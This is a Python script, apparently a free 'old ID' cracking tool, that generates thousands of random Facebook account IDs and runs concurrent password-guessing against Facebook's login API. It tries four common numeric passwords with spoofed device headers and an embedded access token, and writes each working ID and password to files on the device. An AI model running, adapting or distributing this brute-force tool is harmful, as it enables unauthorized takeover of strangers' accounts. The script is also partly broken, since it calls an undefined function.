# Decode By DEEP-XD         
import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
#----------------------------[IMPORT/MODULE]-----------------------------------#

import requests,bs4,json,os,sys,uuid,random,datetime,time,re

import urllib3,rich,base64

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import pretty

from rich.text import Text as tekz

from time import localtime as lt

import os,time,random,json,sys,datetime

try:

    import requests

except:

    os.system("pip3 install requests")

    import requests 

from concurrent.futures import ThreadPoolExecutor as ThreadPool

#-----------------------------[LINE]-----------------------------------#

def lin():

	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

#----------------------------[DATE]-----------------------------------#

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

date = str(tgl)+'-'+str(bln)

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

#----------------------------[COLOR/CODE]-----------------------------------#

A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'

#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    os_list = ['Windows', 'Linux', 'Macintosh', 'Android']
    browser_list = ['Chrome', 'Firefox', 'Safari', 'Edge']
    os_version_list = ['10', '11', '12', 'XP', 'Vista', '7', '8', '9']
    browser_version_list = ['129.0.0.0', '128.0.0.0', '127.0.0.0', '126.0.0.0']

    os = random.choice(os_list)
    browser = random.choice(browser_list)
    os_version = random.choice(os_version_list)
    browser_version = random.choice(browser_version_list)

    if os == 'Android':
        user_agent = f'Mozilla/5.0 ({os}; Android {os_version}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{browser_version} Mobile Safari/537.36'
    else:
        user_agent = f'Mozilla/5.0 ({os} {os_version}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{browser_version} Safari/537.36'

    return user_agent
#----------------------------[LOGO]-----------------------------------#

logo = (f"""\033[1;37m
 .d8b.  d8888b. db   db d888888b 
d8' `8b 88  `8D 88   88   `88'   
88ooo88 88oooY' 88ooo88    88    
88~~~88 88~~~b. 88~~~88    88    
88   88 88   8D 88   88   .88.   
YP   YP Y8888P' YP   YP Y888888P 
###############################################
 TooL Owner: ABHI Jhirwal
 Github    : 4bHii-057
 Facebook  : ABHI Jhirwal
 Version   : Old/0.4/Free \033[1;32m(✓)
\033[1;37m###############################################""")

#----------------------------[MAIN/DEF]-----------------------------------#

def main():

    user=[]

    os.system("clear")

    print(logo)

    print(f'\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000')

    lin()

    limit=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")

    lin()

    os.system('clear')

    print(logo)

    print("\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2010-2009")

    lin()

    ask=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")

    lin()

    if ask in["1"]:

        star="10000"

        for i in range(int(limit)):

            data=str(random.choice(range(1000000000,1999999999)))

            user.append(data)

    else:

        star="10000"

        for i in range(int(limit)):

            data=str(random.choice(range(1000000000,1999999999)))

            user.append(data)    

    with ThreadPool(max_workers=40) as MrDevilEx:

        os.system('clear')

        print(logo)

        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}')

        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE')

        lin()

        for mal in user:

            uid=star+mal

            MrDevilEx.submit(login,uid)    

loop=0

oks=[]

def login(uid):

    global oks,loop

    Session=requests.session()

    try:

        sys.stdout.write(f"\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)")

        sys.stdout.flush()

        for pw in ["123456789","1234567","12345678","123456"]:

            headers = {

            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 

            "x-fb-sim-hni": str(random.randint(20000, 40000)), 

            "x-fb-net-hni": str(random.randint(20000, 40000)), 

            "x-fb-connection-quality": "EXCELLENT",

            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",

            "user-agent": ua(), 

            "content-type": "application/x-www-form-urlencoded", 

            "x-fb-http-engine": "Liger"}

            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()

            if "session_key" in rp:

                print(f"\r\r{G}ABHI-OK {A}| {G}{uid} {A}|{G} {pw}")

                open("/sdcard/ABHI-OLD-OK","a").write(uid+"|"+pw+"\n")

                abhi(uid,pw)

                oks.append(uid)

                break 

            elif "www.facebook.com" in rp["error_msg"]:

                print(f"\r\r{G}ABHI-OK {A}| {G}{uid} {A}|{G} {pw}")

                open("/sdcard/ABHI-OLD-OK.txt","a").write(uid+"|"+pw+"\n")

                oks.append(uid)

                break

            elif "Please Confirm Email" in str(rp):

                print(f"\r\r{G}ABHI-OK {A}| {G}{uid} {A}|{G} {pw}")

                open("/sdcard/ABHI -OLD-OK.txt","a").write(uid+"|"+pw+"\n")

                oks.append(uid)

                break

            else:continue

        loop+=1 

    except:pass

main()

#----------------------------[CODE/END]-----------------------------------
